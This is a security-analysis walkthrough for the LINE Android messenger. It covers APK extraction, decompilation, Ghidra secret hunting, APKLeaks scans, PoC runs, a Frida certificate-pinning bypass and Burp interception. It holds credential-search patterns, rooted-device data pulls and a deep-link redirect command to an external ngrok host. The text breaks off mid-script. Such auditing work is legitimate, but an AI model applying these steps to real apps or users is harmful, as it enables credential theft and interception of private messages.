**LINE ANDROID**

Complete Security Analysis Reproduction Guide

.apkm Extraction → APKTool → Ghidra → APKLeaks → PoC Execution

**February 2026 · EDUCATIONAL PURPOSE ONLY**

|                    |                                                         |
|--------------------|---------------------------------------------------------|
| **Target App**     | LINE Messenger — jp.naver.line.android                  |
| **Input Format**   | .apkm (APKMirror Bundle — contains split APKs)          |
| **Analysis Tools** | APKTool, Ghidra 11.x, APKLeaks, jadx, Frida, Burp Suite |
| **PoC Scripts**    | poc_01 through poc_05 + run_all_pocs.py                 |
| **Tested On**      | Ubuntu 22.04 / macOS 14 / Kali Linux 2024               |

**0. Environment Setup & Prerequisites**

Install every tool before starting. All commands assume a Debian/Ubuntu
or macOS environment.

**0.1 System Dependencies**

> \# ── Ubuntu / Debian / Kali ──────────────────────────────────────
>
> \$ sudo apt update && sudo apt install -y \\
>
> default-jdk-headless \\
>
> python3 python3-pip \\
>
> unzip zip wget curl \\
>
> adb \\
>
> apktool \\
>
> jadx \\
>
> strings binutils
>
> \# ── macOS (Homebrew) ─────────────────────────────────────────────
>
> \$ brew install apktool jadx android-platform-tools openjdk
>
> \# ── Python packages ──────────────────────────────────────────────
>
> \$ pip3 install apkleaks frida-tools objection

**0.2 Ghidra Installation**

> \# Download Ghidra 11.x from https://ghidra-sre.org
>
> \$ wget
> https://github.com/NationalSecurityAgency/ghidra/releases/download/
>
> Ghidra_11.1.2_build/ghidra_11.1.2_PUBLIC_20240709.zip
>
> \$ unzip ghidra_11.1.2_PUBLIC_20240709.zip -d ~/tools/
>
> \$ export GHIDRA_HOME=~/tools/ghidra_11.1.2_PUBLIC
>
> \# Add to ~/.bashrc or ~/.zshrc for persistence:
>
> \$ echo 'export GHIDRA_HOME=~/tools/ghidra_11.1.2_PUBLIC' \>\>
> ~/.bashrc
>
> \$ echo 'export PATH=\$PATH:\$GHIDRA_HOME/support' \>\> ~/.bashrc
>
> \$ source ~/.bashrc
>
> \# Verify:
>
> \$ analyzeHeadless --version
>
> =\> Ghidra 11.1.2

**0.3 Tool Version Verification**

> \$ java -version \# =\> openjdk 17 or 21
>
> \$ apktool --version \# =\> 2.9.x or later
>
> \$ jadx --version \# =\> 1.5.x or later
>
> \$ apkleaks --version \# =\> 2.6.x or later
>
> \$ frida --version \# =\> 16.x or later
>
> \$ adb version \# =\> Android Debug Bridge 1.0.41+
>
> **⚠ NOTE:** Ghidra requires Java 17 or 21. OpenJDK 21 is recommended.
> Do NOT use Java 8 or 11 — Ghidra will fail to launch.

**1. Extract the .apkm Bundle**

**1.1 What is .apkm?**

An .apkm file is APKMirror's proprietary container format. It is a ZIP
archive containing:

- base.apk — the main application APK (always present)

- config.xxhdpi.apk — density-specific resources

- config.arm64_v8a.apk — ABI-specific native libraries (ARM64)

- config.en.apk — language-specific resources

For security analysis, base.apk contains the code. config.arm64_v8a.apk
contains the native .so libraries you need for Ghidra.

**1.2 Step-by-Step Extraction**

> \# Step 1 — Create a working directory
>
> \$ mkdir -p ~/line_audit/apkm && cd ~/line_audit
>
> \$ cp ~/Downloads/line-\*.apkm apkm/line.apkm
>
> \# Step 2 — List the contents of the bundle
>
> \$ unzip -l apkm/line.apkm
>
> =\> Archive: line.apkm
>
> =\> Length Date Time Name
>
> =\> --------- ---------- ----- ----
>
> =\> 87654321 2025-01-15 10:00 base.apk
>
> =\> 5234567 2025-01-15 10:00 config.arm64_v8a.apk
>
> =\> 3123456 2025-01-15 10:00 config.xxhdpi.apk
>
> =\> 891234 2025-01-15 10:00 config.en.apk
>
> =\> 234567 2025-01-15 10:00 config.xhdpi.apk
>
> \# Step 3 — Extract everything
>
> \$ unzip apkm/line.apkm -d apkm/extracted/
>
> \# Step 4 — Verify extracted APKs
>
> \$ ls -lh apkm/extracted/
>
> =\> base.apk 87.7M
>
> =\> config.arm64_v8a.apk 5.0M
>
> =\> config.xxhdpi.apk 3.0M
>
> =\> config.en.apk 0.9M
>
> \# Step 5 — Confirm base.apk is a valid ZIP/APK
>
> \$ file apkm/extracted/base.apk
>
> =\> base.apk: Zip archive data, at least v2.0 to extract
>
> \# Step 6 — Extract the native libs from the ABI config APK
>
> \$ unzip apkm/extracted/config.arm64_v8a.apk 'lib/\*' -d apkm/native/
>
> \$ ls apkm/native/lib/arm64-v8a/
>
> =\> libline.so libsqlcipher.so libopenssl.so libfresco.so ...
>
> **✓ TIP:** The native libraries (.so files) live in
> config.arm64_v8a.apk, NOT in base.apk. If you only decompile base.apk
> you will miss the native libs that PoC-01 scans for hardcoded secrets.

**1.3 Merge APKs for Full Decompilation (Optional but Recommended)**

Some tools work better on a single monolithic APK. Use apktools merge or
manually combine:

> \# Option A: Use APKEditor to merge splits into one APK
>
> \$ wget
> https://github.com/REAndroid/APKEditor/releases/latest/download/APKEditor.jar
>
> \$ java -jar APKEditor.jar m -i apkm/extracted/ -o line_merged.apk
>
> \# Option B: Copy native libs manually into base.apk
>
> \$ cp apkm/extracted/base.apk line_full.apk
>
> \$ cd apkm/native && zip -r ../../line_full.apk lib/
>
> \$ cd ~/line_audit
>
> \# Verify the merged APK has native libs:
>
> \$ unzip -l line_full.apk \| grep '\\so'
>
> =\> lib/arm64-v8a/libline.so
>
> =\> lib/arm64-v8a/libsqlcipher.so
>
> =\> lib/arm64-v8a/libopenssl.so

**2. APKTool — Decompilation & Static Analysis**

**2.1 Decompile base.apk**

> \# Full decompile — generates Smali bytecode + decoded resources
>
> \$ apktool d apkm/extracted/base.apk \\
>
> -o line_decompiled/ \\
>
> --no-src \\
>
> -f
>
> \# What --no-src does: skips .java source (faster — we have Smali)
>
> \# What -f does: force overwrite if output dir exists
>
> \# Verify the output structure:
>
> \$ ls line_decompiled/
>
> =\> AndroidManifest.xml
>
> =\> apktool.yml
>
> =\> res/
>
> =\> smali/
>
> =\> smali_classes2/
>
> =\> smali_classes3/
>
> =\> assets/
>
> =\> unknown/
>
> \# Also decompile the native lib config APK:
>
> \$ apktool d apkm/extracted/config.arm64_v8a.apk \\
>
> -o line_native_decompiled/ -f

**2.2 AndroidManifest.xml Analysis (PoC-04 — Exported Components)**

> \# ── Find ALL exported components ────────────────────────────────
>
> \$ grep -n 'exported="true"' line_decompiled/AndroidManifest.xml
>
> \# ── Find components with intent-filters (implicitly exported) ───
>
> \$ grep -n -B2 '\<intent-filter\>' line_decompiled/AndroidManifest.xml
> \\
>
> \| grep -v 'exported="false"'
>
> \# ── Extract all deep-link URI schemes ────────────────────────────
>
> \$ grep -n 'android:scheme' line_decompiled/AndroidManifest.xml
>
> \# ── Check for dangerous global flags ─────────────────────────────
>
> \$ grep -E
> 'allowBackup\|debuggable\|networkSecurityConfig\|usesCleartextTraffic'
> \\
>
> line_decompiled/AndroidManifest.xml
>
> \# ── List ALL permissions requested ───────────────────────────────
>
> \$ grep 'uses-permission' line_decompiled/AndroidManifest.xml

**2.3 Network Security Config Analysis (PoC-03 — Cert Pinning)**

> \# Locate the network security config file:
>
> \$ find line_decompiled/res/ -name 'network_security_config.xml'
>
> =\> line_decompiled/res/xml/network_security_config.xml
>
> \# Read it — look for \<pin-set\> and \<domain-config\> entries:
>
> \$ cat line_decompiled/res/xml/network_security_config.xml
>
> \# If cleartextTrafficPermitted=true — HTTP allowed (CRITICAL):
>
> \$ grep -r 'cleartextTrafficPermitted' line_decompiled/res/

**2.4 Smali Code Analysis (PoC-02, PoC-05 — Storage & Crypto)**

> \# ── SharedPreferences insecure writes ───────────────────────────
>
> \$ grep -rn 'putString\\putInt\\putLong' \\
>
> line_decompiled/smali/ \\
>
> line_decompiled/smali_classes2/ \\
>
> \| grep -v 'EncryptedSharedPreferences'
>
> \# Check if EncryptedSharedPreferences is used at all:
>
> \$ grep -rn 'EncryptedSharedPreferences\\MasterKey' \\
>
> line_decompiled/smali\*/
>
> \# ── Weak cryptography ────────────────────────────────────────────
>
> \$ grep -rn '"MD5"\\"SHA-1"\\"SHA1"\\"DES"\\"RC4"\\"AES/ECB"' \\
>
> line_decompiled/smali\*/
>
> \# ── Hardcoded strings (broad sweep) ─────────────────────────────
>
> \$ grep -rn 'const-string' line_decompiled/smali\*/ \\
>
> \| grep -iE 'secret\|password\|token\|apikey\|api_key\|bearer\|oauth'
> \\
>
> \| grep -v 'test\\example\\dummy'
>
> \# ── WebView JavaScript interface ─────────────────────────────────
>
> \$ grep -rn
> 'addJavascriptInterface\\setJavaScriptEnabled\\setAllowFileAccess' \\
>
> line_decompiled/smali\*/
>
> \# ── Logging of sensitive data ─────────────────────────────────────
>
> \$ grep -rn 'Log\\d\\Log\\v\\Log\\e\\Log\\i' \\
>
> line_decompiled/smali\*/ \\
>
> \| grep -iE 'token\|user\|pass\|mid\|session\|auth'

**2.5 Asset & Resource Analysis**

> \# Check for embedded databases, keys, or config files:
>
> \$ find line_decompiled/assets/ -type f \| sort
>
> \# Look for SQLite databases (may contain cached messages):
>
> \$ find line_decompiled/ -name '\*.db' -o -name '\*.sqlite'
>
> \# Look for raw key files or PEM certificates:
>
> \$ find line_decompiled/ -name '\*.pem' -o -name '\*.key' -o -name
> '\*.p12'
>
> \# Extract strings from all asset files:
>
> \$ for f in \$(find line_decompiled/assets/ -type f); do
>
> echo "=== \$f ==="
>
> strings "\$f" \| grep -iE 'key\|secret\|token\|api\|password' \| head
> -20
>
> done

**3. Ghidra — Native Library Reverse Engineering**

**3.1 Prepare Native Libraries**

> \# Create Ghidra project directory:
>
> \$ mkdir -p ~/line_audit/ghidra_work/libs
>
> \# Copy .so files from the extracted native APK:
>
> \$ cp apkm/native/lib/arm64-v8a/\*.so ~/line_audit/ghidra_work/libs/
>
> \# List what we have:
>
> \$ ls -lh ~/line_audit/ghidra_work/libs/
>
> =\> -rwxr-xr-x libline.so 13.6M
>
> =\> -rwxr-xr-x libsqlcipher.so 3.2M
>
> =\> -rwxr-xr-x libopenssl.so 2.8M
>
> =\> -rwxr-xr-x libfresco.so 1.4M
>
> \# Verify they are ELF ARM64 binaries:
>
> \$ file ~/line_audit/ghidra_work/libs/\*.so
>
> =\> libline.so: ELF 64-bit LSB shared object, ARM aarch64
>
> \# Quick string dump to preview secrets before Ghidra:
>
> \$ strings -n 8 ~/line_audit/ghidra_work/libs/libline.so \\
>
> \| grep -iE 'key\|secret\|token\|api\|password\|Bearer\|firebase' \\
>
> \| head -40

**3.2 Headless Batch Analysis (Automated)**

Use Ghidra's headless analyser to process all libraries without opening
the GUI. Best for scripted/CI workflows.

> \# Create the Ghidra project and run auto-analysis on all .so files:
>
> \$ \$GHIDRA_HOME/support/analyzeHeadless \\
>
> ~/line_audit/ghidra_work LINE_Project \\
>
> -import ~/line_audit/ghidra_work/libs/\*.so \\
>
> -overwrite \\
>
> -log ~/line_audit/ghidra_headless.log
>
> \# Run headless with post-analysis scripts:
>
> \$ \$GHIDRA_HOME/support/analyzeHeadless \\
>
> ~/line_audit/ghidra_work LINE_Project \\
>
> -process '\*.so' \\
>
> -postScript ExtractStrings.java \\
>
> -scriptPath ~/line_audit/ghidra_scripts/ \\
>
> -scriptlog ~/line_audit/strings_output.txt

**3.3 GUI Analysis — Step by Step**

<table>
<colgroup>
<col style="width: 6%" />
<col style="width: 93%" />
</colgroup>
<tbody>
<tr class="odd">
<td><strong>1</strong></td>
<td><p><strong>Launch Ghidra</strong></p>
<p>Opens the Project Manager window.</p>
<p>$ $GHIDRA_HOME/ghidraRun</p></td>
</tr>
<tr class="even">
<td><strong>2</strong></td>
<td><p><strong>Create New Project</strong></p>
<p>File → New Project → Non-Shared Project → choose
~/line_audit/ghidra_work → name it LINE_Audit</p></td>
</tr>
<tr class="odd">
<td><strong>3</strong></td>
<td><p><strong>Import libline.so</strong></p>
<p>Format: ELF | Language: AARCH64:LE:64:v8A | Click OK</p>
<p>File → Import File → select libline.so</p></td>
</tr>
<tr class="even">
<td><strong>4</strong></td>
<td><p><strong>Run Auto Analysis</strong></p>
<p>Double-click libline.so in the project tree to open CodeBrowser →
Analysis → Auto Analyze → check all defaults → Analyze. Wait 3-10
minutes depending on file size.</p></td>
</tr>
<tr class="odd">
<td><strong>5</strong></td>
<td><p><strong>Search for Secrets in .rodata</strong></p>
<p>In the Defined Strings window, use Ctrl+F to filter: key, secret,
token, Bearer, AIza, AKIA, firebase</p>
<p>Search → For Strings → Min length: 6 → Include: All → Search</p></td>
</tr>
<tr class="even">
<td><strong>6</strong></td>
<td><p><strong>Enumerate JNI Exports</strong></p>
<p>These are the Java Native Interface bridge functions. Double-click
each to navigate to the decompiler view.</p>
<p>Window → Symbol Table → filter column Name: 'Java_'</p></td>
</tr>
<tr class="odd">
<td><strong>7</strong></td>
<td><p><strong>Detect Weak Crypto Constants</strong></p>
<p>Also search for: 0x98BADCFE (SHA-1 H1), 0x10325476 (MD5 D),
0xC3D2E1F0 (SHA-1 H4)</p>
<p>Search → For Scalar Values → Value: 0x67452301 (MD5 init
constant)</p></td>
</tr>
<tr class="even">
<td><strong>8</strong></td>
<td><p><strong>Find High-Entropy Key Material</strong></p>
<p>Look for 16-byte, 32-byte, or 64-byte aligned blocks with no ASCII
characters — likely AES/RSA key material</p>
<p>Window → Memory Map → navigate to .data and .rodata sections</p></td>
</tr>
</tbody>
</table>

**3.4 Custom Ghidra Script — Automated Secret Extraction**

Save this as ~/line_audit/ghidra_scripts/ExtractSecrets.java then run it
in headless mode:

> // File: ~/line_audit/ghidra_scripts/ExtractSecrets.java
>
> // Usage: analyzeHeadless ... -postScript ExtractSecrets.java
>
> import ghidra.app.script.GhidraScript;
>
> import ghidra.program.model.mem.\*;
>
> import ghidra.program.model.address.\*;
>
> import java.util.regex.\*;
>
> public class ExtractSecrets extends GhidraScript {
>
> // Secret patterns to search for
>
> static final String\[\] PATTERNS = {
>
> "AIza\[0-9A-Za-z\\-\_\]{35}", // GCP API Key
>
> "AKIA\[0-9A-Z\]{16}", // AWS Access Key
>
> "eyJ\[A-Za-z0-9-\_=\]{10,}", // JWT Token
>
> "(?i)secret\[\\'\]?\\s\*\[:=\]\[^\\s\]{8,}", // Generic secret
>
> "(?i)api.?key\\s\*\[:=\]\[^\\s\]{8,}", // API Key
>
> "https://\[a-z0-9-\]+\\.firebaseio\\.com", // Firebase URL
>
> };
>
> public void run() throws Exception {
>
> Memory mem = currentProgram.getMemory();
>
> MemoryBlock rodata = mem.getBlock(".rodata");
>
> if (rodata == null) { println("\[-\] No .rodata section"); return; }
>
> byte\[\] data = new byte\[(int)rodata.getSize()\];
>
> rodata.getBytes(rodata.getStart(), data);
>
> String content = new String(data, "ISO-8859-1");
>
> for (String pat : PATTERNS) {
>
> Matcher m = Pattern.compile(pat).matcher(content);
>
> while (m.find()) {
>
> long offset = rodata.getStart().getOffset() + m.start();
>
> printf("\[MATCH\] Pattern: %-30s Offset: 0x%08X Value: %s%n",
>
> pat.substring(0, Math.min(30, pat.length())),
>
> offset, m.group().substring(0, Math.min(60, m.group().length())));
>
> }
>
> }
>
> println("\[\*\] ExtractSecrets complete for: " +
>
> currentProgram.getName());
>
> }
>
> }
>
> \# Run the script headless:
>
> \$ \$GHIDRA_HOME/support/analyzeHeadless \\
>
> ~/line_audit/ghidra_work LINE_Project \\
>
> -process 'libline.so' \\
>
> -postScript ExtractSecrets.java \\
>
> -scriptPath ~/line_audit/ghidra_scripts/ \\
>
> -scriptlog ~/line_audit/secrets_found.txt
>
> \# View results:
>
> \$ cat ~/line_audit/secrets_found.txt \| grep '\\MATCH\\'

**4. APKLeaks — Automated Secrets & Endpoint Discovery**

**4.1 Basic Scan**

> \# Scan base.apk (APKLeaks decompiles internally with jadx):
>
> \$ apkleaks -f apkm/extracted/base.apk
>
> \# Save results to JSON:
>
> \$ apkleaks -f apkm/extracted/base.apk -o
> ~/line_audit/apkleaks_base.json
>
> \# Also scan the native lib config APK:
>
> \$ apkleaks -f apkm/extracted/config.arm64_v8a.apk \\
>
> -o ~/line_audit/apkleaks_native.json
>
> \# View summarised results:
>
> \$ python3 -c "
>
> import json
>
> data = json.load(open('~/line_audit/apkleaks_base.json'))
>
> for k, v in data.items():
>
> if v: print(f'\[{k}\] {len(v)} match(es): {v\[:2\]}')
>
> "

**4.2 Enhanced Scan with Custom Patterns**

Create a custom pattern file targeting LINE-specific secret formats:

> \# Create custom_patterns.json:
>
> \$ cat \> ~/line_audit/custom_patterns.json \<\< 'EOF'
>
> {
>
> "LINE_Channel_Token":"line-channel-access-token\[\\'\]?\\s\*\[:=\]\\s\*(\[A-Za-z0-9+/=\]{40,})",
>
> "LINE_Channel_Secret":"channel.?secret\[\\'\]?\\s\*\[:=\]\\s\*(\[a-f0-9\]{32})",
>
> "Firebase_Server_Key":"AAAA\[A-Za-z0-9\_-\]{7}:\[A-Za-z0-9\_-\]{140}",
>
> "AWS_Key":"AKIA\[0-9A-Z\]{16}",
>
> "GCP_Key":"AIza\[0-9A-Za-z\\-\_\]{35}",
>
> "JWT":"eyJ\[A-Za-z0-9-\_=\]+\\.eyJ\[A-Za-z0-9-\_=\]+\\.\[A-Za-z0-9-\_.+/=\]+",
>
> "Private_Key":"-----BEGIN (RSA \|EC )?PRIVATE KEY-----",
>
> "Internal_URL":"https?://\[a-z0-9-\]+\\.line-apps\\.com",
>
> "Staging_URL":"https?://(stg\|dev\|staging\|internal)\[^\\s'\\\]+",
>
> "IP_Internal":"\\b(10\|192\\.168\|172\\.(1\[6-9\]\|2\[0-9\]\|3\[0-1\]))\\.\\d+\\.\\d+\\b"
>
> }
>
> EOF
>
> \# Run with custom patterns:
>
> \$ apkleaks -f apkm/extracted/base.apk \\
>
> -p ~/line_audit/custom_patterns.json \\
>
> -o ~/line_audit/apkleaks_custom.json \\
>
> --json
>
> \# Combined report:
>
> \$ python3 -c "
>
> import json
>
> base = json.load(open('~/line_audit/apkleaks_base.json'))
>
> custom = json.load(open('~/line_audit/apkleaks_custom.json'))
>
> merged = {\*\*base, \*\*custom}
>
> for k, v in sorted(merged.items()):
>
> if v:
>
> print(f'\n\[{k}\] ({len(v)} matches)')
>
> for m in v\[:5\]: print(f' {m}')
>
> " 2\>/dev/null

**5. PoC Script Execution — Step by Step**

With all decompiled artifacts ready, run the PoC scripts against real
files.

<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 85%" />
</colgroup>
<tbody>
<tr class="odd">
<td><p><strong>CRITICAL</strong></p>
<p>CVSS 9.1</p></td>
<td><p><strong>PoC-01 | Hardcoded Secrets in Native
Libraries</strong></p>
<p>CWE-798</p></td>
</tr>
</tbody>
</table>

> \# Scan the full APK (extracts .so files internally):
>
> \$ python3 poc_01_hardcoded_secrets.py \\
>
> --apk apkm/extracted/base.apk \\
>
> --out ~/line_audit/results/poc01_secrets.json
>
> \# Also scan the native lib APK (has more .so content):
>
> \$ python3 poc_01_hardcoded_secrets.py \\
>
> --apk apkm/extracted/config.arm64_v8a.apk \\
>
> --out ~/line_audit/results/poc01_native_secrets.json
>
> \# Scan a single .so directly (fastest for targeted analysis):
>
> \$ python3 poc_01_hardcoded_secrets.py \\
>
> --lib apkm/native/lib/arm64-v8a/libline.so \\
>
> --out ~/line_audit/results/poc01_libline.json
>
> \# Expected key output to look for:
>
> =\> \[!\] SECRETS (N found):
>
> =\> Pattern : GCP_API_Key
>
> =\> Offset : 0x83a4f0
>
> =\> Match : AIzaSy...
>
> =\> Entropy : 4.821

<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 85%" />
</colgroup>
<tbody>
<tr class="odd">
<td><p><strong>HIGH</strong></p>
<p>CVSS 7.5</p></td>
<td><p><strong>PoC-02 | Insecure SharedPreferences Storage</strong></p>
<p>CWE-312</p></td>
</tr>
</tbody>
</table>

> \# ── Option A: Scan Smali bytecode (no device needed) ────────────
>
> \$ python3 poc_02_insecure_storage.py \\
>
> --smali line_decompiled/smali \\
>
> --out ~/line_audit/results/poc02_smali.json
>
> \# Also scan smali_classes2, smali_classes3 if present:
>
> \$ for dir in line_decompiled/smali\*/; do
>
> echo "=== Scanning \$dir ==="
>
> python3 poc_02_insecure_storage.py --smali "\$dir"
>
> done
>
> \# ── Option B: Analyse extracted SharedPreferences from device ────
>
> \# First extract via ADB (device needed, USB debugging on):
>
> \$ adb backup -noapk jp.naver.line.android -f
> ~/line_audit/line_backup.ab
>
> \# Decode the Android Backup format:
>
> \$ dd if=~/line_audit/line_backup.ab bs=1 skip=24 \\
>
> \| python3 -c \\
>
> "import zlib,sys;
> sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" \\
>
> \| tar xvf - -C ~/line_audit/backup_extracted/
>
> \# Now scan the extracted XML files:
>
> \$ python3 poc_02_insecure_storage.py \\
>
> --prefs-dir
> ~/line_audit/backup_extracted/apps/jp.naver.line.android/sp/ \\
>
> --out ~/line_audit/results/poc02_prefs.json
>
> \# Or on a rooted device — pull directly:
>
> \$ adb shell su -c 'cp -r
> /data/data/jp.naver.line.android/shared_prefs /sdcard/line_sp'
>
> \$ adb pull /sdcard/line_sp ~/line_audit/pulled_prefs/
>
> \$ python3 poc_02_insecure_storage.py \\
>
> --prefs-dir ~/line_audit/pulled_prefs/ \\
>
> --out ~/line_audit/results/poc02_root.json

<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 85%" />
</colgroup>
<tbody>
<tr class="odd">
<td><p><strong>HIGH</strong></p>
<p>CVSS 7.4</p></td>
<td><p><strong>PoC-03 | Certificate Pinning Analysis</strong></p>
<p>CWE-295</p></td>
</tr>
</tbody>
</table>

> \# Analyse network_security_config.xml + scan Smali + generate Frida
> script:
>
> \$ python3 poc_03_cert_pinning.py \\
>
> --nsc line_decompiled/res/xml/network_security_config.xml \\
>
> --smali line_decompiled/smali \\
>
> --gen-frida \\
>
> --out ~/line_audit/results/poc03_pinning.json
>
> \# Optionally live-verify LINE domain certificates:
>
> \$ python3 poc_03_cert_pinning.py \\
>
> --nsc line_decompiled/res/xml/network_security_config.xml \\
>
> --verify \\
>
> --out ~/line_audit/results/poc03_live.json
>
> \# This generates ssl_bypass.js — use it with Frida (next section):
>
> \$ ls -la ssl_bypass.js
>
> \$ cat ssl_bypass.js \| head -30

<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 85%" />
</colgroup>
<tbody>
<tr class="odd">
<td><p><strong>HIGH</strong></p>
<p>CVSS 7.3</p></td>
<td><p><strong>PoC-04 | Exported Activity / Deep Link
Hijacking</strong></p>
<p>CWE-926</p></td>
</tr>
</tbody>
</table>

> \# Analyse AndroidManifest.xml for exported components:
>
> \$ python3 poc_04_exported_activities.py \\
>
> --manifest line_decompiled/AndroidManifest.xml \\
>
> --package jp.naver.line.android \\
>
> --out ~/line_audit/results/poc04_components.json
>
> \# View generated ADB exploitation commands from the JSON:
>
> \$ python3 -c "
>
> import json
>
> data = json.load(open('~/line_audit/results/poc04_components.json'))
>
> for c in data\['components'\]:
>
> if c\['severity'\] in ('CRITICAL','HIGH'):
>
> print(f\\\[{c\['severity'\]}\] {c\['class_name'\]}\\)
>
> for cmd in c\['adb_commands'\]:
>
> print(f\\ \$ {cmd}\\)
>
> "
>
> \# Execute the ADB commands on a connected test device:
>
> \# (device must be connected with USB debugging enabled)
>
> \$ adb devices
>
> =\> List of devices attached
>
> =\> emulator-5554 device
>
> \$ adb shell am start \\
>
> -n jp.naver.line.android/.ui.DeepLinkHandlerActivity \\
>
> -d 'line://msg/redirect?url=https://your-server.ngrok.io/log'

<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 85%" />
</colgroup>
<tbody>
<tr class="odd">
<td><p><strong>HIGH</strong></p>
<p>CVSS 7.0 / 6.8</p></td>
<td><p><strong>PoC-05 | Weak Crypto + WebView JS Interface</strong></p>
<p>CWE-327 / CWE-749</p></td>
</tr>
</tbody>
</table>

> \# Scan ALL smali directories for weak crypto + WebView issues:
>
> \$ python3 poc_05_crypto_webview.py \\
>
> --smali line_decompiled/smali \\
>
> --out ~/line_audit/results/poc05_crypto.json
>
> \# Scan secondary dex classes too:
>
> \$ for dir in line_decompiled/smali\*/; do
>
> echo "=== \$dir ==="
>
> python3 poc_05_crypto_webview.py --smali "\$dir"
>
> done
>
> \# View WebView findings + generated XSS payloads:
>
> \$ python3 -c "
>
> import json
>
> data = json.load(open('~/line_audit/results/poc05_crypto.json'))
>
> print('=== CRYPTO FINDINGS ===')
>
> for f in data\['crypto'\]:
>
> print(f\\\[{f\['severity'\]}\] {f\['algorithm'\]} @
> {f\['file'\]}:{f\['line'\]}\\)
>
> print('\n=== WEBVIEW FINDINGS ===')
>
> for f in data\['webview'\]:
>
> print(f\\\[{f\['severity'\]}\] {f\['issue_type'\]} @
> {f\['file'\]}:{f\['line'\]}\\)
>
> if f.get('interface_name'):
>
> print(f\\ Bridge: window.{f\['interface_name'\]}\\)
>
> "

**5.6 Run the Complete Suite**

> \# Full analysis — all 5 PoCs against decompiled APK:
>
> \$ python3 run_all_pocs.py \\
>
> --apk apkm/extracted/base.apk \\
>
> --smali line_decompiled/smali \\
>
> --manifest line_decompiled/AndroidManifest.xml \\
>
> --nsc line_decompiled/res/xml/network_security_config.xml \\
>
> --out ~/line_audit/results/audit_summary.json
>
> \# Run a single PoC:
>
> \$ python3 run_all_pocs.py --poc 1 \\
>
> --apk apkm/extracted/base.apk

**6. Dynamic Analysis — Certificate Pinning Bypass & Traffic
Interception**

After static analysis confirms pinning gaps, use Frida to bypass at
runtime and intercept LINE's API traffic via Burp Suite.

**6.1 Setup Frida Server on Test Device**

> **⚠ NOTE:** Use a dedicated test device or Android emulator. Never
> perform dynamic analysis on a personal or work phone.
>
> \# Find your device architecture:
>
> \$ adb shell getprop ro.product.cpu.abi
>
> =\> arm64-v8a
>
> \# Download matching Frida server from
> https://github.com/frida/frida/releases
>
> \$ wget https://github.com/frida/frida/releases/download/16.x.x/
>
> frida-server-16.x.x-android-arm64.xz
>
> \$ unxz frida-server-16.x.x-android-arm64.xz
>
> \# Push to device and set permissions (requires root):
>
> \$ adb push frida-server-16.x.x-android-arm64
> /data/local/tmp/frida-server
>
> \$ adb shell chmod 755 /data/local/tmp/frida-server
>
> \# Start the Frida server:
>
> \$ adb shell su -c '/data/local/tmp/frida-server &'
>
> \# Verify connection:
>
> \$ frida-ps -U \| grep line
>
> =\> 12345 jp.naver.line.android

**6.2 Apply Certificate Pinning Bypass**

> \# The ssl_bypass.js was generated by poc_03_cert_pinning.py
>
> \# Apply it at app launch:
>
> \$ frida -U \\
>
> -f jp.naver.line.android \\
>
> -l ssl_bypass.js \\
>
> --no-pause
>
> \# Or attach to a running process:
>
> \$ frida -U \\
>
> --attach-name jp.naver.line.android \\
>
> -l ssl_bypass.js
>
> \# Alternative — use objection (wraps Frida with extra features):
>
> \$ objection -g jp.naver.line.android explore
>
> \# Inside objection shell:
>
> objection\> android sslpinning disable
>
> objection\> android heap search instances okhttp3.OkHttpClient

**6.3 Configure Burp Suite Proxy**

<table>
<colgroup>
<col style="width: 6%" />
<col style="width: 93%" />
</colgroup>
<tbody>
<tr class="odd">
<td><strong>1</strong></td>
<td><p><strong>Start Burp Suite</strong></p>
<p>Open Burp Suite Community/Pro. Go to Proxy → Options → Add
Listener.</p></td>
</tr>
<tr class="even">
<td><strong>2</strong></td>
<td><p><strong>Add Proxy Listener</strong></p>
<p>Bind Address: 0.0.0.0 Port: 8080 Interface: All. Click OK.</p></td>
</tr>
<tr class="odd">
<td><strong>3</strong></td>
<td><p><strong>Find your machine IP</strong></p>
<p>Note the IP address — e.g., 192.168.1.50</p>
<p>$ ifconfig | grep 'inet ' | grep -v 127.0.0.1</p></td>
</tr>
<tr class="even">
<td><strong>4</strong></td>
<td><p><strong>Configure Android Device Proxy</strong></p>
<p>On the test device: Settings → WiFi → Long-press network → Modify →
Advanced → Proxy: Manual → Host: 192.168.1.50 Port: 8080</p></td>
</tr>
<tr class="odd">
<td><strong>5</strong></td>
<td><p><strong>Intercept Traffic</strong></p>
<p>In Burp: Proxy → Intercept → Intercept is ON. Then open LINE and
trigger actions. Intercepted requests appear in Burp.</p></td>
</tr>
<tr class="even">
<td><strong>6</strong></td>
<td><p><strong>Verify Pinning is Bypassed</strong></p>
<p>If pinning bypass works you will see decrypted HTTPS requests to
api.line.me and other endpoints in Burp's HTTP History tab.</p>
<p># In LINE: send a message, open the store, load any content</p></td>
</tr>
</tbody>
</table>

**7. Expected Output Files**

|                                             |                                         |
|---------------------------------------------|-----------------------------------------|
| **~/line_audit/apkm/extracted/**            | Extracted base.apk, config.\*.apk files |
| **~/line_audit/apkm/native/lib/**           | Extracted .so native libraries          |
| **~/line_audit/line_decompiled/**           | Full APKTool decompilation output       |
| **~/line_audit/ghidra_work/**               | Ghidra project and .gzf files           |
| **~/line_audit/secrets_found.txt**          | Ghidra headless ExtractSecrets output   |
| **~/line_audit/apkleaks_base.json**         | APKLeaks results for base.apk           |
| **~/line_audit/apkleaks_custom.json**       | APKLeaks custom pattern results         |
| **~/line_audit/results/poc01\_\*.json**     | PoC-01 hardcoded secrets findings       |
| **~/line_audit/results/poc02\_\*.json**     | PoC-02 SharedPreferences findings       |
| **~/line_audit/results/poc03\_\*.json**     | PoC-03 certificate pinning findings     |
| **~/line_audit/results/poc04\_\*.json**     | PoC-04 exported component findings      |
| **~/line_audit/results/poc05\_\*.json**     | PoC-05 crypto + WebView findings        |
| **~/line_audit/ssl_bypass.js**              | Frida cert pinning bypass script        |
| **~/line_audit/results/audit_summary.json** | Master summary from run_all_pocs.py     |

**7.1 Consolidate All Findings**

> \# Generate a combined findings report across all PoCs:
>
> \$ python3 - \<\< 'EOF'
>
> import json, glob, os
>
> findings = \[\]
>
> for f in
> glob.glob(os.path.expanduser('~/line_audit/results/\*.json')):
>
> try:
>
> data = json.load(open(f))
>
> name = os.path.basename(f)
>
> if 'findings' in data:
>
> findings += \[{\*\*x, 'source': name} for x in data\['findings'\]\]
>
